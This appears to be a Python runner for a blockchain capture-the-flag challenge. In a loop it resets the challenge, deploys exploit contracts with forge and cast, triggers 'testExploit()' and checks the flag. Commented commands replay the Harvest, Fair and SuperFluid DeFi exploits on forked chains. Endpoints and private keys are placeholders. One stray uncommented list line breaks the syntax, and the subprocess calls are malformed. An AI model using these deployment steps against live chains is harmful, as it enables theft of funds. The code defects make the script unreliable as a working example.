import subprocess
import time
import flag
import string
from concurrent.futures import ThreadPoolExecutor


def run_command(cmd):
    # print(f"Running: {cmd}")
    subprocess.run(cmd, shell=False, check=True)

##
# commands = [
    # "forge test --fork-url https://rpc.ankr.com/eth --fork-block-number 11128720 --match-path ./test/HarvestFFExploit.sol -vv",
    # "forge test --fork-url https://rpc.ankr.com/eth --fork-block-number 14684685 --match-path ./test/FairFFExploit.sol -vvv",
    # "forge test --fork-url https://rpc.ankr.com/polygon  --fork-block-number 24684668 --match-path ./test/SuperFluidFFExploit.sol -vv",
# ]


# commands = [
    "forge test --fork-url https://fake.io/rw/1/rpc/1_7761_00000000000000000000000000000000000000000000000000000000000 --chain-id 2400 --match-path ./test/HarvestFFExploit.sol -vvv",
    # "forge test --fork-url https://fake.io/rw/2/rpc/2_7761_00000000000000000000000000000000000000000000000000000000000 --chain-id 2401 --match-path ./test/FairFFExploit.sol -vv",
    # "forge test --fork-url https://fake.io/rw/3/rpc/3_7761_00000000000000000000000000000000000000000000000000000000000 --chain-id 2402 --match-path ./test/SuperFluidFFExploit.sol -vv",
    # "forge test --fork-url https://fake.io/rw/4/rpc/4_7761_00000000000000000000000000000000000000000000000000000000000 --chain-id 2403 --match-path ./test/SuperFluidFFExploit.sol -vv",
# ]

creates = [
    '''/Users/zer0luck/.foundry/bin/forge create --rpc-url https://fake.io/rw/2/rpc/2_7761_00000000000000000000000000000000000000000000000000000000000 --private-key 0x0000000000000000000000000000000000000000000000000000000000000 /Users/zer0luck/blockchain/RealWorld/src/FairFF/FairExploitMaster.sol:ExploitTest'''
]

commands = [
    '''/Users/zer0luck/.foundry/bin/cast send --rpc-url https://fake.io/rw/2/rpc/2_7761_00000000000000000000000000000000000000000000000000000000000 --private-key 0x0000000000000000000000000000000000000000000000000000000000000 0x2EBB06c0683f62873B76714FF51bBD2bC245Fa1C "testExploit()"'''
]


if __name__ == "__main__":
    while(1):
        print(flag.reset(2))
        time.sleep(5)
        flag.get_block_number()
        time.sleep(1)
        subprocess.run(creates, shell=False, check=True)
        time.sleep(5)
        subprocess.run(commands, shell=False, check=True)
        time.sleep(1)
        print(flag.check(2))
        # if((flag.check(2).find("fuck")) == -1):
        #     break

    




# forge create --rpc-url https://fake.io/rw/2/rpc/2_7761_00000000000000000000000000000000000000000000000000000000000 --private-key 0x0000000000000000000000000000000000000000000000000000000000000 ./src/FairFF/FairExploitMaster.sol:ExploitTest

# Deployer: 0xc943eDB4Bb4439d65B81f2f60Bc698411e910B14
# Deployed to: 0x2EBB06c0683f62873B76714FF51bBD2bC245Fa1C
# Transaction hash: 0xe30fb54fd6c921d851046a29209137c30748cc8f67cf1a5182811c1a6ec56f3c

# cast send --rpc-url https://fake.io/rw/2/rpc/2_7761_00000000000000000000000000000000000000000000000000000000000 --private-key 0x0000000000000000000000000000000000000000000000000000000000000 0x2EBB06c0683f62873B76714FF51bBD2bC245Fa1C "testExploit()"



# forge script ./test/HarvestFFExploit.sol:ExploitTest --fork-url https://fake.io/rw/1/rpc/1_7761_00000000000000000000000000000000000000000000000000000000000 --private-key 0x0000000000000000000000000000000000000000000000000000000000000 --chain-id 2400 --broadcast
# forge create --legacy --rpc-url https://fake.io/rw/1/rpc/1_7761_00000000000000000000000000000000000000000000000000000000000 --private-key 0x0000000000000000000000000000000000000000000000000000000000000 ./src/HarvestFF/HarvestExploitMaster.sol:ExploitTest
# Deployer: 0xc943eDB4Bb4439d65B81f2f60Bc698411e910B14
# Deployed to: 0x2EBB06c0683f62873B76714FF51bBD2bC245Fa1C
# Transaction hash: 0x2b96e8b016b82efaeaa2ffb2b4d90f347ad7e80e0d1ba34d13b53df40913e264

# cast send --rpc-url https://fake.io/rw/1/rpc/1_7761_00000000000000000000000000000000000000000000000000000000000 --private-key 0x0000000000000000000000000000000000000000000000000000000000000 0x2EBB06c0683f62873B76714FF51bBD2bC245Fa1C "testExploit()"



# forge script ./test/SuperFluidFFExploit.sol:ExploitTest --fork-url https://fake.io/rw/3/rpc/3_7761_00000000000000000000000000000000000000000000000000000000000 --chain-id 2402 --broadcast


# forge create --rpc-url https://fake.io/rw/3/rpc/3_7761_00000000000000000000000000000000000000000000000000000000000 --private-key 0x0000000000000000000000000000000000000000000000000000000000000 ./src/SuperFluid/SuperFluidExploitMaster.sol:ExploitTest
# Deployer: 0xc943eDB4Bb4439d65B81f2f60Bc698411e910B14
# Deployed to: 0x2EBB06c0683f62873B76714FF51bBD2bC245Fa1C
# Transaction hash: 0xff037f55c1f1a040755322a7cbd843d01d42341005b9b16038b27cad3053addb

# cast send --rpc-url https://fake.io/rw/3/rpc/3_7761_00000000000000000000000000000000000000000000000000000000000 --private-key 0x0000000000000000000000000000000000000000000000000000000000000 0x2EBB06c0683f62873B76714FF51bBD2bC245Fa1C "testExploit()"